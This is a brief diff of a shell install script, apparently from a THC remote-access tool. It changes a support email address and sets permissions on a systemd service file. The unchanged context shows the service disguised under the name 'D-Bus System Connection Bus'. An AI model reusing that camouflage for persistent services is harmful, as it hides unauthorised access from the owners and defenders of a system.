@@ -893,7 +893,7 @@ WARN_EXECFAIL_SET()
 WARN_EXECFAIL()
 {
 	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
-	echo -e "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
+	echo -e "--> Please send this output to ${CC}root@proton.thc.org${CN} to get it fixed."
 	echo -e "--> ${WARN_EXECFAIL_MSG}"
 }
 
@@ -953,6 +953,7 @@ install_system_systemd()
 
 	# Create the service file
 	mk_file "${SERVICE_FILE}" || return
+	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
 	echo "[Unit]
 Description=D-Bus System Connection Bus
 After=network.target
